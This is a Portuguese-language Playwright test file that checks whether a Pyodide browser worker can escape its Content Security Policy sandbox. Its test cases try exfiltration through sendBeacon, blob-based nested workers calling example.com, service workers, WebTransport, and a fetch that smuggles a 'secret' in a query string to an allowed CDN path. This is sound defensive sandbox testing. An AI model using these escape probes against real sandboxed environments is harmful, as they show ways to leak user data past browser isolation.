"""Fuga do worker do Pyodide no navegador, sob a CSP real. Só roda com E2E_PYODIDE=1 (baixa ~20 MB do jsDelivr).

Sobe o app numa thread e abre uma página mínima que só cria o worker e posta o código (HTML gerado aqui).
Motores: E2E_MOTORES=chromium,firefox,webkit (padrão: os três).
"""
import os
import socket
import threading
import time

import pytest
import uvicorn

pytestmark = pytest.mark.skipif(not os.environ.get("E2E_PYODIDE"), reason="defina E2E_PYODIDE=1 para rodar")
sync_api = pytest.importorskip("playwright.sync_api")

MOTORES = os.environ.get("E2E_MOTORES", "chromium,firefox,webkit").split(",")
CARGA_MS = 120_000

# a página de teste é servida pelo próprio app de teste, com a CSP real da página
PAGINA = '<!doctype html><meta charset=utf-8><script src="/teste-worker.js"></script>'
# o script vai em arquivo à parte: a CSP da página não permite script inline
SCRIPT = r"""window.rodar = (codigo) => new Promise((ok) => {
  const w = new Worker("/static/python-worker.js", {type: "module"});
  const prazo = (tipo, ms) => setTimeout(() => { ok({tipo}); w.terminate(); }, ms);
  const carga = prazo("timeout_carga", 90000);
  let execucao;
  w.onmessage = ({data}) => {
    clearTimeout(carga); clearTimeout(execucao);
    if (data.tipo === "pronto") { execucao = prazo("timeout_execucao", 15000); w.postMessage({codigo, csv: "a\n1\n", preludio: ""}); }
    else ok(data);
    if (data.tipo !== "pronto") w.terminate();
  };
});
"""


@pytest.fixture(scope="module")
def url():
    from fastapi import Response
    from fastapi.responses import HTMLResponse

    from app.main import create_app
    app = create_app()
    app.add_api_route("/teste-worker", lambda: HTMLResponse(PAGINA), methods=["GET"])
    app.add_api_route("/teste-worker.js", lambda: Response(SCRIPT, media_type="text/javascript"), methods=["GET"])
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        porta = s.getsockname()[1]
    servidor = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=porta, log_level="warning"))
    threading.Thread(target=servidor.run, daemon=True).start()
    while not servidor.started:
        time.sleep(0.05)
    yield f"http://127.0.0.1:{porta}"
    servidor.should_exit = True


@pytest.fixture(scope="module", params=MOTORES)
def navegador(request):
    with sync_api.sync_playwright() as p:
        nav = getattr(p, request.param).launch()
        yield nav
        nav.close()


@pytest.fixture()
def rodar(navegador, url):
    pag = navegador.new_page()
    pag.violacoes = []
    pag.on("console", lambda m: pag.violacoes.append(m.text) if "Content Security Policy" in m.text
           or "Content-Security-Policy" in m.text else None)
    pag.goto(f"{url}/teste-worker")

    def _rodar(codigo: str) -> dict:
        return pag.evaluate("(c) => window.rodar(c)", codigo)

    _rodar.pagina = pag
    yield _rodar
    pag.close()


def _fuga(rodar, codigo: str) -> dict:
    """O código tenta a fuga; imprime SAIU se ela funcionou. Bloqueado = erro e nenhum SAIU."""
    r = rodar(codigo)
    assert r["tipo"] in ("resultado", "timeout_execucao"), r  # o WebKit bloqueia o fetch sem nunca rejeitar a promessa
    assert "SAIU" not in r.get("saida", "")
    return r



def _sonda(rodar, expr: str) -> dict:
    """Roda uma expressão JS-via-Python e imprime o resultado ou o erro (sem asserção: o teste decide)."""
    codigo = f"""import js
try:
    r = {expr}
    print("OK", r)
except Exception as e:
    print("ERRO", type(e).__name__, str(e)[:120])
"""
    r = rodar(codigo)
    print("\n>>>", expr, "=>", r)
    return r


def test_send_beacon_nao_existe_no_worker(rodar) -> None:
    r = _sonda(rodar, "js.navigator.sendBeacon('https://example.com/b', 'x')")
    assert r["tipo"] == "resultado" and r["saida"].startswith("ERRO"), r


def test_import_scripts_bloqueado(rodar) -> None:
    for alvo in ("https://example.com/x.js", "/static/app.js"):
        r = _sonda(rodar, f"js.importScripts({alvo!r})")
        assert r["tipo"] == "resultado" and r["saida"].startswith("ERRO"), r


def test_worker_aninhado_blob_e_self_bloqueados(rodar) -> None:
    codigo = """import js, asyncio
from pyodide.ffi import create_proxy, to_js
res = []
for url in [js.URL.createObjectURL(js.Blob.new(to_js(["fetch('https://example.com/?w').then(()=>postMessage('SAIU'))"]), to_js({"type": "text/javascript"}, dict_converter=js.Object.fromEntries))),
            "/static//python-worker.js", "/static/python-worker.js"]:
    try:
        w = js.Worker.new(url)
        fut = asyncio.get_event_loop().create_future()
        w.onerror = create_proxy(lambda e, f=fut: f.done() or f.set_result("erro_evento"))
        w.onmessage = create_proxy(lambda e, f=fut: f.done() or f.set_result(str(e.data)))
        try:
            res.append(await asyncio.wait_for(fut, 5))
        except asyncio.TimeoutError:
            res.append("sem_resposta")
    except Exception as e:
        res.append("ERRO " + type(e).__name__)
print(res)
"""
    r = rodar(codigo)
    print("\n>>> aninhado =>", r)
    assert "SAIU" not in r.get("saida", ""), r


def test_service_worker_nao_registra(rodar) -> None:
    codigo = """import js
try:
    sw = js.navigator.serviceWorker
    if sw is None or not hasattr(sw, "register"):
        print("ausente")
    else:
        await sw.register("/static/app.js")
        print("SAIU")
except Exception as e:
    print("ERRO", type(e).__name__, str(e)[:120])
"""
    r = rodar(codigo)
    print("\n>>> sw =>", r)
    assert "SAIU" not in r.get("saida", ""), r


def test_broadcast_channel_existe_mas_ninguem_escuta(rodar) -> None:
    pag = rodar.pagina
    pag.evaluate("() => { window.bc = []; for (const n of ['analista','python','x']) { const c = new BroadcastChannel(n); c.onmessage = (e) => window.bc.push(n + ':' + e.data); } }")
    r = _sonda(rodar, "[js.BroadcastChannel.new(n).postMessage('dado') for n in ('analista','python','x')]")
    recebidos = pag.evaluate("() => window.bc")
    print(">>> página do teste recebeu:", recebidos)
    assert r["saida"].startswith("OK"), r  # o canal existe: só não é rede


def test_fetch_ao_caminho_do_pyodide_com_query_sai(rodar) -> None:
    r = rodar("import js\nr = await js.fetch('https://cdn.jsdelivr.net/pyodide/v0.28.3/full/x?d=segredo')\nprint('STATUS', r.status)")
    print("\n>>> jsdelivr query =>", r)


def test_function_e_eval_negados(rodar) -> None:
    r = _sonda(rodar, "js.Function.new('return 1')()")
    assert r["saida"].startswith("ERRO"), r


def test_indexeddb_e_cache_acessiveis(rodar) -> None:
    r = _sonda(rodar, "(type(js.indexedDB).__name__, hasattr(js, 'caches'))")
    print(">>> armazenamento =>", r)


def test_webtransport_bloqueado(rodar) -> None:
    codigo = """import js
try:
    t = js.WebTransport.new('https://example.com:443/')
    await t.ready
    print('SAIU')
except Exception as e:
    print('bloqueado', type(e).__name__)
"""
    r = rodar(codigo)
    print("\n>>> webtransport =>", r)
    assert "SAIU" not in r.get("saida", ""), r
